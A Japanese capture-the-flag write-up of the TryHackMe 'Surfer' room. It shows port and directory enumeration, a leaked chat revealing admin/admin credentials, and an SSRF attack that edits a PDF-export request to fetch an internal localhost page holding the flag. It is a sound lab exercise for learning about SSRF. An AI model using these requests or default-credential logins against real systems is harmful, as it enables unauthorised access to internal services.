# Surfer CTF

https://tryhackme.com/room/surfer

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.210.126

root@ip-10-10-243-70:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-11 00:44 GMT
Nmap scan report for 10.10.210.126
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:BA:64:FB:01:73 (Unknown)

root@ip-10-10-243-70:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-11 00:44 GMT
Nmap scan report for 10.10.210.126
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 02:BA:64:FB:01:73 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-243-70:~# gobuster dir -x php,txt -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.210.126
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 4774]
/assets               (Status: 301) [Size: 315] [--> http://10.10.210.126/assets/]
/index.php            (Status: 302) [Size: 0] [--> /login.php]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/changelog.txt        (Status: 200) [Size: 816]
/vendor               (Status: 301) [Size: 315] [--> http://10.10.210.126/vendor/]
/backup               (Status: 301) [Size: 315] [--> http://10.10.210.126/backup/]
/robots.txt           (Status: 200) [Size: 40]
/internal             (Status: 301) [Size: 317] [--> http://10.10.210.126/internal/]
/verify.php           (Status: 302) [Size: 0] [--> /login.php]
/Readme.txt           (Status: 200) [Size: 222]
/server-status        (Status: 403) [Size: 278]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

robots.txt
```text
User-Agent: *
Disallow: /backup/chat.txt
```

/changelog.txt
```text
Version: 2.2.1
  - Typo fix in the login.html template: passwword -> password
  - Updated all outdated third party vendor libraries to their latest versions

Version: 2.2.0
  - Updated Bootstrap to version 5.1.3
  - Updated all outdated third party vendor libraries to their latest versions

Version: 2.1.0
  - Updated Bootstrap to version 5.1.2

Version: 2.0.0
  - The template was rebuilt from scratch with the latest Bootstrap version (5.1.1)
  - Added NodeJS NPM Development version (Pro unlimited & Membership members)
  - Update to latest version PHP Email Form

Version: 1.2.0
  - Updated all outdated third party vendor libraries to their latest versions
  - Other small fixes and updates

Version: 1.1.0
  - Cleanup old libraries and small fixes

Version: 1.0.0
  - Initial Release
```

/Readme.txt
```text
Thanks for downloading this template!

Template Name: NiceAdmin
Template URL: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/
Author: BootstrapMade.com
License: https://bootstrapmade.com/license/
```


/backup/chat.txt
```text

Admin: I have finished setting up the new export2pdf tool.
Kate: Thanks, we will require daily system reports in pdf format.
Admin: Yes, I am updated about that.
Kate: Have you finished adding the internal server.
Admin: Yes, it should be serving flag from now.
Kate: Also Don't forget to change the creds, plz stop using your username as password.
Kate: Hello.. ?
```

- export2pdf がインストールされている
- インターナルサーバーはフラグを返す
- 認証情報は admin/ admin 

## ダッシュボード

Recent Activity
```text
Recent Activity | Today
32 min
System Stats Report Generated.
56 min
Recovered from unexpected downtime.
2 hrs
System Stats Report Generated.
1 day
Internal pages hosted at /internal/admin.php. It contains the system flag.
2 days
System Stats Report Generated.
4 weeks
24X7 System+ Installed on the server.
```

PDFエクスポートボタンを押すと、http://10.10.210.126/export2pdf.php に移動し、PDFが表示される。

```text
Report generated for http://127.0.0.1/server-info.php
```
ローカルホストにリクエストしていることが分かる。

```http
POST /export2pdf.php HTTP/1.1
Host: 10.10.210.126
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.10.210.126
Connection: keep-alive
Referer: http://10.10.210.126/index.php
Cookie: PHPSESSID=c09606b93c58e73d4f0e787f0c48b02e
Upgrade-Insecure-Requests: 1

url=http%3A%2F%2F127.0.0.1%2Fserver-info.php
```

POSTリクエストのurlパラメータに実行するPHPを指定しているので、/internal/admin.php に変更して送信。

```http
POST /export2pdf.php HTTP/1.1
Host: 10.10.210.126
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://10.10.210.126
Connection: keep-alive
Referer: http://10.10.210.126/index.php
Cookie: PHPSESSID=c09606b93c58e73d4f0e787f0c48b02e
Upgrade-Insecure-Requests: 1

url=http://127.0.0.1/internal/admin.php
```

フラグが入ったPDFが表示された。

```text
Report generated for http://127.0.0.1/internal/admin.php
flag{62......}
```

フラグゲット！

## 振り返り

- 列挙をきちんと実行して、SSRFの概念を知っていれば簡単
